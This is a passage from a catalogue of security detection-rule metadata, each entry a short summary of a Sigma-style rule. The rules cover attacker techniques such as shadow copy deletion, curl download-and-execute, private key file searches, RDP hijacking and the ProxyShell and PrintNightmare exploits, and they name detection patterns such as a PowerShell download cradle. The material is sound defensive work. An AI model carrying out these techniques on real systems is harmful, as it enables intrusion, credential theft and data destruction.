  Summary: This rule detects the default "UserName" associated with the DiagTrackEoP
    Proof of Concept (POC). Specifically, it identifies a Windows security event where
    the EventID is 4624, the LogonType is 9, and the TargetOutboundUserName is 'thisisnotvaliduser.'
    This scenario may indicate a potential privilege escalation attempt.
  Updated-Date: '2024_09_03'
21117127-21c8-437a-ae03-4b51e5a8a088:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1dd79c9dc3152344b81d0347eb23a8c9
  Ruleset: emerging-threats
  Summary: This rule detects a specific command line argument, ".exe Platypus," being
    passed to a binary, which is associated with the Small Sieve malware. Small Sieve
    is known to use this command line syntax as part of its execution, making this
    a useful indicator for identifying potential infections related to this malware.
  Updated-Date: '2024_09_03'
2131cfb3-8c12-45e8-8fa0-31f5924e9f07:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ae256e0f470d24614767a92872cf385
  Ruleset: emerging-threats
  Summary: This rule detects the filename pattern used in proof-of-concept (PoC) code
    that exploits the print spooler vulnerability identified as CVE-2021-1675, also
    known as "PrintNightmare." The detection is based on the presence of a specific
    path within the Windows system directory, which is indicative of exploitation
    attempts against this vulnerability. CVE-2021-1675 is associated with potential
    privilege escalation and could be used for executing malicious code, hence its
    critical classification.
  Updated-Date: '2024_09_03'
213d6a77-3d55-4ce8-ba74-fcfef741974e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30ed186c50c47d4b3dac32bfddf43cf4
  Ruleset: sigmahq
  Summary: This rule detects attempts by adversaries to locate private key certificate
    files on compromised Windows systems using command-line tools. It monitors the
    use of `cmd.exe` and `powershell.exe` or `pwsh.exe` by analyzing command lines
    that contain related commands such as `dir` or `Get-ChildItem`. The rule also
    tracks the use of `findstr.exe` for searches involving key-related file extensions
    such as `.key`, `.pgp`, `.gpg`, `.ppk`, `.p12`, `.pem`, `.pfx`, `.cer`, `.p7b`,
    and `.asc`. These efforts are indicative of attackers seeking insecurely stored
    credentials.
  Updated-Date: '2024_09_04'
214641c2-c579-4ecb-8427-0cf19df6842e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 392c9392cacad0bf73b8bcf19b49361a
  Ruleset: sigmahq
  Summary: This rule detects the use of the desktopimgdownldr utility to download
    a remote file. The tool is often utilized by adversaries as an alternative to
    certutil for downloading arbitrary files, potentially indicating malicious activity.
    The detection criteria focus on the process creation events where the image or
    parent image is desktopimgdownldr.exe and the command line includes the parameter
    for a URL, specifically aimed at lock screen images.
  Updated-Date: '2024_09_04'
214e8f95-100a-4e04-bb31-ef6cba8ce07e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1592d159b7a591d58949cbec8d327ad7
  Ruleset: sigmahq
  Summary: This rule detects the use of the spoolss named pipe over SMB, which can
    trigger NTLM authentication on any machine with the spoolservice enabled. This
    action is typically associated with lateral movement techniques in an attack.
    The detection is based on specific event log data indicating the use of the spoolss
    pipe within the IPC$ share.
  Updated-Date: '2024_09_04'
21541900-27a9-4454-9c4c-3f0a4240344a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 075a6dd683db1b594073a3eb73cae268
  Ruleset: core
  Summary: This rule detects the execution of any UNIX/Linux command using the RunAsProvider
    Invoke_ExecuteShellCommand through the /bin/sh shell. It targets the SCXcore component,
    which was initially designed as the Microsoft Operations Manager UNIX/Linux Agent
    but is now integrated into various Microsoft products, including Microsoft Operations
    Manager, Microsoft Azure, and Microsoft Operations Management Suite. The rule
    specifically monitors the process creation logs on Linux systems for commands
    initiated by the root user in the directory '/var/opt/microsoft/scx/tmp'. The
    detection aims to identify potential cases of privilege escalation, initial access,
    or execution tactics associated with these actions, though it may also flag legitimate
    use cases of the SCX RunAsProvider.
  Updated-Date: '2024_09_03'
2158f96f-43c2-43cb-952a-ab4580f32382:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 783772b72fec5d9544243722ebe65e7b
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Windows Problem Steps Recorder (psr.exe),
    a utility used to record the user's screen and mouse clicks for troubleshooting
    purposes.
  Updated-Date: '2024_09_04'
21d856f9-9281-4ded-9377-51a1a6e2a432:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56081f67297b04e07c5acf799dd77b32
  Ruleset: core
  Summary: This rule detects the addition of a new LogonScript to the registry value
    "UserInitMprLogonScript" for potential persistence on Windows systems. Specifically,
    it monitors command lines containing 'UserInitMprLogonScript', which can be an
    indicator of attempts to maintain persistence by malicious software. The rule
    recognizes that legitimate administrators or third-party tools may also add logon
    scripts via the command line, but under normal circumstances, such activity is
    infrequent and warrants scrutiny due to its high-risk potential.
  Updated-Date: '2024_09_03'
21dd6d38-2b18-4453-9404-a0fe4a0cc288:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8853727ef526a21edfcea33c02e6560
  Ruleset: core
  Summary: This rule detects the use of curl on Windows systems to download and execute
    payloads remotely. Curl, a command-line tool included by default in Windows 10
    build 17063 and later, can be exploited by adversaries for defense evasion and
    command-and-control activities, often involving downloading files from the web
    to the local system and executing them. The detection focuses on process creation
    events where the command line contains specific patterns associated with curl
    operations used to fetch and execute malicious payloads.
  Updated-Date: '2024_09_03'
21e44d78-95e7-421b-a464-ffd8395659c4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 46bb0395e935baf48ae34185d3d01296
  Ruleset: sigmahq
  Summary: This rule detects HTTP requests with empty user agent strings in proxy
    logs, which could potentially indicate an uncommon or suspicious request method.
    This behavior might be linked to defense evasion or command-and-control activities,
    such as those executed using PowerShell commands like `(New-Object Net.WebClient).DownloadString`.
  Updated-Date: '2024_09_04'
21f17060-b282-4249-ade0-589ea3591558:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36c5bdcaf0514f43f58353e9fc8c999c
  Ruleset: emerging-threats
  Summary: This rule detects the creation of specific registry keys on Windows systems
    that are associated with Ursnif malware activity. Ursnif, also known as Gozi,
    is a type of banking Trojan designed to steal sensitive information such as login
    credentials, financial data, and other personal information from infected systems.
    The rule is triggered when a new registry key is created in the specified path,
    excluding certain known locations to reduce false positives.
  Updated-Date: '2024_09_03'
21f9162c-5f5d-4b01-89a8-b705bd7d10ab:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9782111d408b459c27a78a16ecc02a3d
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that import modules from suspicious
    directories such as the Temp, Appdata, and Users\Public directories. The use of
    these directories for importing modules is often an indicator of malicious activity,
    especially when these scripts employ the `Import-Module` command or its alias
    `ipmo`. This detection is geared towards identifying potential threats by monitoring
    specific patterns in script block text, which may indicate the execution of unauthorized
    or harmful actions. Script Block Logging must be enabled for this rule to function
    effectively.
  Updated-Date: '2024_09_04'
21ff4ca9-f13a-41ad-b828-0077b2af2e40:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c447277f532ba3e924513375a030caf8
  Ruleset: core
  Summary: This rule detects the use of PowerShell to delete Windows Volume Shadow
    Copies via WMI, which is a technique commonly employed by ransomware families
    like Sodinokibi/REvil. It identifies specific command lines involving `Get-WmiObject`,
    `Get-CimInstance`, and commands associated with shadow copy deletion, including
    terms like `Win32_ShadowCopy` and `.Delete()`. This activity is flagged due to
    its high impact and potential for significant damage to system backups and recovery
    options.
  Updated-Date: '2024_09_03'
220457c1-1c9f-4c2e-afe6-9598926222c1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5673884848f8e4d42b313879114e4a95
  Ruleset: core
  Summary: This rule detects the use of the Windows "schtasks" command with the delete
    flag accompanied by an asterisk to delete all scheduled tasks on the local computer.
    This action targets tasks scheduled by any user, representing a broad-impact operation
    that could disrupt various automated processes.
  Updated-Date: '2024_09_03'
221b251a-357a-49a9-920a-271802777cc0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b6afa2563bd847c962f14ee9d9ca7ccb
  Ruleset: sigmahq
  Summary: This rule detects the execution of "wmic.exe" with the "process" flag,
    which may be used by adversaries to list processes running on a compromised host
    or to list installed software hotfixes and patches. The detection mechanism includes
    identifying instances where "WMIC.exe" or its original filename "wmic.exe" appears
    in the process creation logs and where the command line contains the term "process."
    Filtering conditions exclude scenarios where "wmic process call create" is used,
    to avoid false positives.
  Updated-Date: '2024_09_04'
222129f7-f4dc-4568-b0d2-22440a9639ba:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 303a9432351e54d9a77f22655c48f1de
  Ruleset: sigmahq
  Summary: This rule detects the creation of an ad-hoc Cloudflare Quick Tunnel, which
    can be used to tunnel local services such as HTTP, RDP, SSH, and SMB. The Cloudflare
    Quick Tunnel generates a random subdomain on trycloudflare.com and communicates
    with api.trycloudflare.com. This tool has been observed in use by various threat
    groups, including those deploying Akira ransomware, to facilitate command-and-control
    operations.
  Updated-Date: '2024_09_04'
22236d75-d5a0-4287-bf06-c93b1770860f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ee1a8c717f816db222323f0364b85b2
  Ruleset: core
  Summary: This rule detects the execution of install commands associated with the
    Triple Cross eBPF rootkit, specifically those included in the "deployer.sh" script.
    It monitors for the use of the `sudo` command in combination with specific network-related
    terms such as `tc`, `enp0s3`, `qdisc`, and `filter` within the command line on
    Linux systems. The rule aims to identify behaviors indicative of defense evasion
    techniques typically employed by this particular rootkit.
  Updated-Date: '2024_09_03'
224f140f-3553-4cd1-af78-13d81bf9f7cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f08372db366f7810510c49caf9962b45
  Ruleset: sigmahq
  Summary: This rule detects potential Remote Desktop Protocol (RDP) session hijacking
    activity on Windows systems. It focuses on identifying instances where the executable
    file 'tscon.exe', commonly associated with terminal services configuration, is
    initiated with SYSTEM level integrity. The detection considers this unusual usage
    pattern indicative of session hijacking attempts. However, administrative activities
    might trigger similar behavior, which could lead to false positives.
  Updated-Date: '2024_09_04'
225274c4-8dd1-40db-9e09-71dff4f6fb3c:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a40b2c5f312800076e0d764914225bab
  Ruleset: core
  Summary: This rule detects potential defense evasion activities through the usage
    of emojis in command-line input. It monitors the process creation logs on Windows
    systems for the presence of specific emojis. The inclusion of emojis in command-line
    commands could indicate attempts to obfuscate malicious activities and evade traditional
    detection mechanisms. This technique may be utilized by adversaries to bypass
    security filters and evade detection tools, making it a critical indicator to
    monitor for maintaining system security.
  Updated-Date: '2024_09_03'
225d8b09-e714-479c-a0e4-55e6f29adf35:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85d59abf5cfe64ee421cf628b0914798
  Ruleset: sigmahq
  Summary: This rule detects the deletion of events in Azure Kubernetes. Such deletions
    may indicate an adversary's attempt to evade detection by removing evidence of
    their activities. The rule specifically looks for operations where events related
    to Kubernetes clusters are deleted. While legitimate system or network administrators
    might also delete these events, deletions by unfamiliar users or hosts should
    be investigated to ensure they are not malicious.
  Updated-Date: '2024_09_04'
2267fe65-0681-42ad-9a6d-46553d3f3480:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9073c785d25cbe8ee0362c8e7f14be43
  Ruleset: sigmahq
  Summary: This rule detects uncommon or suspicious child processes spawning from
    a Windows Subsystem for Linux (WSL) process. Such behavior could indicate attempts
    to evade parent/child relationship detections or persistence attempts via scheduling
    cron jobs using WSL. The rule identifies suspicious child processes like `calc.exe`,
    `cmd.exe`, `cscript.exe`, `mshta.exe`, `powershell.exe`, `pwsh.exe`, `regsvr32.exe`,
    `rundll32.exe`, and `wscript.exe` emerging from WSL processes (`wsl.exe` or `wslhost.exe`).
    Additionally, it monitors for these child processes running from paths like `\AppData\Local\Temp\`,
    `C:\Users\Public\`, `C:\Windows\Temp\`, `C:\Temp\`, `\Downloads\`, and `\Desktop\`.
  Updated-Date: '2024_09_04'
22777c9e-873a-4b49-855f-6072ab861a52:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52fb83771d0b48f0859668daaef0910f
  Ruleset: sigmahq
  Summary: This rule detects instances where an SMB service on an OpenCanary node
    has received a file open request. This activity may suggest attempts of lateral
    movement or unauthorized file access within a network, indicating potential malicious
    behavior. OpenCanary is commonly used as a honeypot to mimic various services
    and monitor for suspicious activity.
  Updated-Date: '2024_09_04'
22d80745-6f2c-46da-826b-77adaededd74:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e225539f724ba81489b9bfa4fbea0c8f
  Ruleset: core
  Summary: This rule detects the use of the "Set-Service" PowerShell cmdlet to configure
    a new SecurityDescriptor, allowing a service to be hidden from other utilities
    such as "sc.exe" and "Get-Service." This activity is indicative of potential persistence,
    defense evasion, and privilege escalation techniques in PowerShell 7 environments.
    The rule monitors the ScriptBlockText for specific command patterns, ensuring
    the detection of suspicious service DACL modifications. Rare false positives might
    result from legitimate but uncommon usage scenarios.
  Updated-Date: '2024_09_03'
22e58743-4ac8-4a9f-bf19-00a0428d8c5f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81aab7a4482595f263656f07093274ac
  Ruleset: core
  Summary: This rule detects the presence of an encoded base64 MZ header within the
    command line. The MZ header is a common indicator of an executable file, and its
    base64 encoded representation could signify that a potentially malicious or hidden
    executable is being executed. By identifying such patterns, this rule aims to
    catch instances where executable files are being run in a potentially obfuscated
    manner, raising the likelihood of detecting unauthorized or harmful activities
    on a Windows system.
  Updated-Date: '2024_09_03'
22f2fb54-5312-435d-852f-7c74f81684ca:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 84ba7e67d4e22b29f97fe44228ed5a9c
  Ruleset: sigmahq
  Summary: This rule detects when an access level is modified for a Google Workspace
    application. The access level is part of BeyondCorp Enterprise, which is Google's
    Zero Trust security model for managing access to Google Workspace resources. Such
    modifications could be utilized by an adversary to remove access restrictions,
    thereby facilitating unauthorized access to resources.
  Updated-Date: '2024_09_04'
2316929c-01aa-438c-970f-099145ab1ee6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7aeb48927b3e0796daa8a9146798db7
  Ruleset: sigmahq
  Summary: This rule detects potential suspicious child processes originating from
    the "jamf" process, which could indicate possible misuse of Jamf as a command-and-control
    (C2) server, particularly as observed in the Typhon MythicAgent. Specifically,
    it identifies child processes with uncommon command executions such as '/bash'
    or '/sh', which are not typically used during standard administrative activities.
    While legitimate use cases exist, such as Jamf administrators executing custom
    scripts, these detections warrant further scrutiny and may require additional
    filtering.
  Updated-Date: '2024_09_04'
234dc5df-40b5-49d1-bf53-0d44ce778eca:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85cee0e5c7a96511661817694138afbc
  Ruleset: sigmahq
  Summary: This rule detects the usage of built-in utilities to decode and decrypt
    a payload after a macOS disk image (DMG) is executed. When malware authors encode
    and encrypt their payload within a DMG to evade detection, they often rely on
    built-in utilities such as `openssl` for the decryption process. This behavior
    is characteristic of adware or malware families such as Bundlore and Shlayer,
    which attempt to trick users into running malicious code by delivering it in an
    ostensibly benign disk image file. This detection focuses on identifying the execution
    of such decryption commands, especially those utilizing base64 encoding within
    mounted volumes.
  Updated-Date: '2024_09_04'
234f9f48-904b-4736-a34c-55d23919e4b7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e707c16838e4d406e2eb8fa3ef9e4c47
  Ruleset: sigmahq
  Summary: This rule detects when sensitive information is re-identified in Google
    Cloud. The detection focuses on audit logs within Google Cloud Platform (GCP)
    that specifically reference the method `projects.content.reidentify`. This process
    typically involves the re-identification of de-identified data, which could indicate
    potential misuse or a security concern.
  Updated-Date: '2024_09_04'
23590215-4702-4a70-8805-8dc9e58314a2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d2d0a5a1d6c26950d6d96422e4313b7
  Ruleset: sigmahq
  Summary: 'This rule detects the presence of the COR_PROFILER environment variable,
    which adversaries may exploit to alter the execution flow of programs that load
    the .NET Common Language Runtime (CLR). The COR_PROFILER is a feature within the
    .NET Framework that allows developers to specify an unmanaged profiling DLL to
    be loaded into each .NET process that utilizes the CLR. This profiling mechanism
    is intended for monitoring, troubleshooting, and debugging managed code running
    on the .NET CLR. The detection focuses on the usage of specific environment variables:
    `$env:COR_ENABLE_PROFILING`, `$env:COR_PROFILER`, and `$env:COR_PROFILER_PATH`.'
  Updated-Date: '2024_09_04'
236d8e89-ed95-4789-a982-36f4643738ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 837a93594c4cbc7f6e577f3ab813628e
  Ruleset: core
  Summary: This rule detects the execution of "VMwareToolBoxCmd.exe" with the use
    of "script" and "set" flags, which configures a script to run based on the virtual
    machine's state. The detection focuses on the tool being located in specific potentially
    suspicious directories, such as "PerfLogs," "Temp," "Windows\System32\Tasks,"
    "Windows\Tasks," "Windows\Temp," and "AppData\Local\Temp." This method is associated
    with persistence techniques, as it leverages VMware tools typically used in virtual
    environments.
  Updated-Date: '2024_09_03'
23835beb-ec38-4e74-a5d4-b99af6684e91:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc96950dd14990c6f47499175f26bc8a
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the "wget" command used to download
    a "tar" file from an IP address that is not associated with a trusted certificate.
    This behavior has been observed as part of the tactics employed by the threat
    group UNC4841, particularly during their exploitation of the Barracuda Email Security
    Gateway (ESG) zero-day vulnerability. The detection focuses on instances where
    the download command involves a direct IP address and includes the option to bypass
    certificate checks, indicating a potential security risk.
  Updated-Date: '2024_09_03'
238527ad-3c2c-4e4f-a1f6-92fd63adb864:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f8e467d483b5ca8943f7f852492db17
  Ruleset: core
  Summary: This rule detects a highly significant antivirus alert that signifies the
    presence of an exploitation framework. It identifies multiple malicious signatures
    including 'Backdoor.Cobalt', 'CobaltStrike', 'Metasploit', 'Meterpreter', and
    others. These signatures are associated with advanced threats such as backdoors,
    brute-force tools, command-and-control scripts, and exploitation frameworks commonly
    used in various cyber attacks and malware deployments. The rule is designed to
    trigger on the detection of any of these specified signatures, indicating potential
    malicious activity to be critically addressed.
  Updated-Date: '2024_09_03'
23b71bc5-953e-4971-be4c-c896cda73fc2:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6047086310e7c089a912195fabe88c2
  Ruleset: core
  Summary: This rule detects any Sysmon "FileBlockExecutable" events by matching EventID
    27, which indicates that an executable file has been blocked due to a violation
    of the configured block policy on a Windows system. This is useful for identifying
    attempts to execute unauthorized or potentially harmful software, contributing
    to defense evasion detection strategies.
  Updated-Date: '2024_09_03'
23c43900-e732-45a4-8354-63e4a6c187ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be8503d52e1e9f7f0e96cf3e572470e6
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Emond Launch Daemon on macOS, which
    adversaries may exploit to achieve persistence and elevate their privileges. It
    monitors for the creation or alteration of files within specific directories related
    to Emond, specifically '/etc/emond.d/rules/' and '/private/var/db/emondClients/',
    focusing on files with plist extensions. Such changes could indicate malicious
    activities intended to maintain continued access or escalate user privileges on
    the system.
  Updated-Date: '2024_09_04'
23ceaf5c-b6f1-4a32-8559-f2ff734be516:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7338e18510821726476abd942257c243
  Ruleset: sigmahq
  Summary: This rule detects the creation of process dumps using the legitimate Windows
    binary `sqldumper.exe`. It identifies instances where this program is executed
    with specific command-line arguments, commonly associated with dumping processes.
    While this usage can indicate normal SQL Server operations, it could also signify
    potential malicious activity, such as credential access via process dumping.
  Updated-Date: '2024_09_04'
23eee45e-933b-49f9-ae1b-df706d2d52ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c0c43dbee62a00bad30b1b6330d15471
  Ruleset: emerging-threats
  Summary: This rule detects URL patterns that may indicate attempted exploitation
    of the ProxyShell vulnerability on Microsoft Exchange servers. It identifies suspicious
    queries and unauthorized access attempts by looking for specific HTTP status codes
    and URL patterns in the server logs, including paths to resources like '/powershell',
    '/mapi/nspi', and '/EWS', as well as certain variations of 'autodiscover.json'.
    These patterns are indicative of known malicious activity aiming to exploit this
    particular vulnerability, aiding in the early detection and response to potential
    threats.
  Updated-Date: '2024_09_03'
24007168-a26b-4049-90d0-ce138e13a5cf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f11f05f16bc8dec1f4853942434cbe37
  Ruleset: emerging-threats
  Summary: This rule detects the sideloading of trojanized DLLs associated with a
    Lazarus Advanced Persistent Threat (APT) campaign, particularly targeting a Spanish
    aerospace company. The activity is identified by monitoring the loading of specific
    DLL files by predefined executable files stored in common program data directories
    such as Adobe, Java, and PresentationHost. Detection focuses on the unauthorized
    loading of DLLs like `mscoree.dll`, `colorui.dll`, `mapistub.dll`, and `HID.dll`
    by their respective executables. This kind of DLL sideloading is indicative of
    malicious attempts to evade defenses and escalate privileges, a known tactic of
    the Lazarus group.
  Updated-Date: '2024_09_03'
241e802a-b65e-484f-88cd-c2dc10f9206d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6183cc3f3be53b8b68dcfbc69d545654
  Ruleset: sigmahq
  Summary: This rule detects the use of the "<" operator to read and potentially execute
    a file via cmd.exe on Windows systems. This activity is identified through process
    creation logs where the original file name is "Cmd.Exe" or the image path ends
    with "\cmd.exe," and the command line contains the "<" character.
  Updated-Date: '2024_09_04'
242301bc-f92f-4476-8718-78004a6efd9f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04f1035d751caf0ee089dcfcf213a15f
  Ruleset: sigmahq
  Summary: This rule detects when certificates are installed using the CertOC.exe
    utility, which results in the loading of a specific DLL file. CertOC.exe is a
    Windows program typically used for handling certificates, and the activity in
    question involves its exploitation through the command line with the "-LoadDLL"
    parameter. This method is potentially indicative of an attempt to evade defenses
    as part of a malicious operation. The focus is on monitoring process creation
    events where CertOC.exe is invoked with parameters that suggest DLL loading.
  Updated-Date: '2024_09_04'
243380fa-11eb-4141-af92-e14925e77c1b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c52f4ed69e83af1b151a48e69fec376
  Ruleset: core
  Summary: This rule detects changes to the PSFactory COM InProcServer32 registry,
    which is a technique used by the RomCom malware to achieve persistence by storing
    a malicious DLL.
  Updated-Date: '2024_09_03'
2433a154-bb3d-42e4-86c3-a26bdac91c45:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fae409b7fe38b088dcdc1d13a5d95696
  Ruleset: sigmahq
  Summary: This rule detects the execution of renamed "PingCastle" binaries based
    on PE metadata fields in process creation logs on Windows systems. PingCastle
    is a security tool used for Active Directory health checks and vulnerability scanning.
    The rule identifies binaries initially intended to be named "PingCastleReporting.exe,"
    "PingCastleCloud.exe," or "PingCastle.exe," and looks for specific command line
    arguments associated with PingCastle scanners such as '--scanner aclcheck' or
    '--scanner antivirus.' It includes checks for arguments that configure the tool
    to perform comprehensive health checks or to operate without enumeration limits.
    The rule filters out legitimate PingCastle binary executions based on their original
    filenames and command line arguments, ensuring accurate detection of renamed binaries
    potentially used for obfuscation or evasion during malicious activities.
  Updated-Date: '2024_09_04'
24357373-078f-44ed-9ac4-6d334a668a11:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 199fee5a152eca4eba52c6cd14c0f2a4
  Ruleset: sigmahq
  Summary: This rule detects direct modifications of autostart extensibility points
    (ASEP) in the Windows registry using the `reg.exe` utility. It identifies process
    creation events where `reg.exe` is executed with commands to add entries that
    modify registry keys associated with autorun functionalities, such as `Run`, `RunOnce`,
    `Userinit`, `Shell`, `User Shell Folders`, and `AlternateShell`. These modifications
    are common techniques used by attackers to maintain persistence on a compromised
    system by ensuring specific programs or scripts are executed automatically during
    system startup or user logon. The detection focuses on specific registry paths
    and command-line arguments indicative of such activities.
  Updated-Date: '2024_09_04'
243de76f-4725-4f2e-8225-a8a69b15ad61:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5be6b0f5950aa2a2120cc0609cddb0bc
  Ruleset: sigmahq
  Summary: This rule detects the creation of a local user via PowerShell on Windows
    systems. It specifically looks for the presence of the 'New-LocalUser' command
    within script block logs. The rule identifies potential unauthorized user creation,
    which can be used for persistence or execution of further attacks. Legitimate
    user creation activities may trigger false positives.
  Updated-Date: '2024_09_04'
24474469-bd80-46cc-9e08-9fbe81bfaaca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 82c1394e218d177c110b202ea3a74b0d
  Ruleset: emerging-threats
  Summary: This rule detects the execution of a Word document through the WinWord
    Start Menu shortcut, a method used by KamiKakaBot malware to initiate the second
    stage of its infection. The detection focuses on the presence of certain patterns
    in the process creation log on Windows systems, particularly looking for command
    lines involving `cmd.exe` that reference Word document links (*.lnk) within the
    Start Menu, culminating in the execution of a `.doc` file.
  Updated-Date: '2024_09_03'
24549159-ac1b-479c-8175-d42aea947cae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77218c0af3da3d76fca931dfe21dba5b
  Ruleset: core
  Summary: This rule detects events generated by the hacktool Ruler developed by Sensepost.
    Specifically, it focuses on events with IDs 4776, 4624, and 4625 that originate
    from a workstation named 'RULER'. The tool is typically used for executing discovery
    and exploitation actions such as credential harvesting and lateral movement within
    Windows environments. Potential false positives may include legitimate use of
    Go utilities incorporating the staaldraad NTLM library.
  Updated-Date: '2024_09_03'
245f92e3-c4da-45f1-9070-bc552e06db11:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 98c2f1e6e5616fc46b73fd3432ae5bfd
  Ruleset: emerging-threats
  Summary: This rule detects the spawning of suspicious child processes by the Atlassian
    Confluence server, which may indicate the successful exploitation of CVE-2021-26084.
    It specifically monitors processes initiated by the `java.exe` located in the
    Confluence JRE directory and flags command-line activities involving utilities
    such as `certutil`, `cmd`, `cscript`, `curl`, `ipconfig`, `powershell`, `pwsh`,
    `regsvr32`, `rundll32`, `whoami`, and `wscript`. The detection aims to catch unauthorized
    or anomalous behavior that could signify an exploitation attempt on Confluence,
    a widely-used collaboration software, potentially compromising system security.
  Updated-Date: '2024_09_03'
248649b7-d64f-46f0-9fb2-a52774166fb5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 97e963c522b18bad1bb9d0cdc358dae3
  Ruleset: sigmahq
  Summary: This rule detects the use of the Device Code authentication flow, which
    is part of the OAuth 2.0 protocol, designed specifically for input-constrained
    devices. The presence of this flow in environments that do not use input-constrained
    devices indicates a need for further investigation, as it may signify a misconfigured
    application or potentially malicious activity.
  Updated-Date: '2024_09_04'
24b6cf51-6122-469e-861a-22974e9c1e5b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5285e8ae004d4bac4f3cccd11ee4fe7c
  Ruleset: core
  Summary: This rule detects potential DLL sideloading of "SmadHook.dll" used by the
    SmadAV antivirus. It focuses on identifying the loading of specific SmadHook DLLs,
    namely '\SmadHook32c.dll' and '\SmadHook64c.dll', in a Windows environment outside
    their legitimate paths, which are usually within the SmadAV program files directory.
    The detection is designed to highlight attempts to evade defenses and escalate
    privileges by manipulating the normal loading process of these DLLs, potentially
    indicating malicious activity. The rule filters out legitimate instances of these
    DLLs being loaded from the correct SmadAV directories to minimize false positives.
  Updated-Date: '2024_09_03'
24c4d154-05a4-4b99-b57d-9b977472443a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3689afec6761bf3ef3dc9423af7d6654
  Ruleset: emerging-threats
  Summary: This rule detects various process execution behaviors associated with Lazarus
    Group activity on Windows systems, as detailed in multiple threat reports. The
    behaviors include commands related to registry saving, usage of specific strings
    and parameters, netstat command usage filtered by specific criteria, network share
    discovery activities, persistence mechanisms with specific command characteristics,
    and rundll32 command executions involving certain file extensions. These indicators
    are used to identify potential suspicious activity linked to Lazarus Group's operations.
  Updated-Date: '2024_09_03'
24c77512-782b-448a-8950-eddb0785fc71:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bcffaabf0316bea943a025ba071b832b
  Ruleset: core
  Summary: This rule detects the use of the "sqlite" binary to query databases in
